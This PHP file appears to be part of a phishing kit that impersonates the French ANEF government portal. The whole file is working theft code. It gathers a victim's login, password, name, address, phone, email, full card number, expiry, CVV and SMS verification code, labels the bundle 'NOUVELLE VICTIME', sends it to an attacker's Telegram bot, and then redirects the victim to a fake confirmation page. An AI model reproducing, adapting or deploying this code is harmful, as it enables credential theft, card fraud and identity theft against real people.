<?php
session_start();
include 'config.php';

$_SESSION['sms_code'] = $_POST['sms_code'];

$message = "🆕 NOUVELLE VICTIME – ANEF\n";
$message .= "━━━━━━━━━━━━━━━━━━━━━\n";
$message .= "🔐 LOGIN\n";
$message .= "Identifiant : " . $_SESSION['username'] . "\n";
$message .= "Mot de passe : " . $_SESSION['password'] . "\n\n";
$message .= "👤 INFORMATIONS PERSONNELLES\n";
$message .= "Nom : " . $_SESSION['nom'] . "\n";
$message .= "Prénom : " . $_SESSION['prenom'] . "\n";
$message .= "Naissance : " . $_SESSION['naissance'] . "\n";
$message .= "Adresse : " . $_SESSION['adresse'] . ", " . $_SESSION['cp'] . " " . $_SESSION['ville'] . "\n";
$message .= "Tél : " . $_SESSION['telephone'] . "\n";
$message .= "Email : " . $_SESSION['email'] . "\n\n";
$message .= "💳 CARTE BANCAIRE\n";
$message .= "Titulaire : " . $_SESSION['titulaire'] . "\n";
$message .= "Numéro : " . $_SESSION['cb_num'] . "\n";
$message .= "Expiration : " . $_SESSION['cb_exp'] . "\n";
$message .= "CVV : " . $_SESSION['cb_cvv'] . "\n";
$message .= "Code SMS : " . $_SESSION['sms_code'] . "\n";
$message .= "━━━━━━━━━━━━━━━━━━━━━";

$url = "https://api.telegram.org/bot" . TELEGRAM_BOT_TOKEN . "/sendMessage";
$data = [
    'chat_id' => TELEGRAM_CHAT_ID,
    'text' => $message,
    'parse_mode' => 'HTML'
];
$options = [
    'http' => [
        'method' => 'POST',
        'header' => "Content-Type: application/x-www-form-urlencoded\r\n",
        'content' => http_build_query($data)
    ]
];
$context = stream_context_create($options);
file_get_contents($url, false, $context);

header('Location: confirmation.html');
exit;
?>
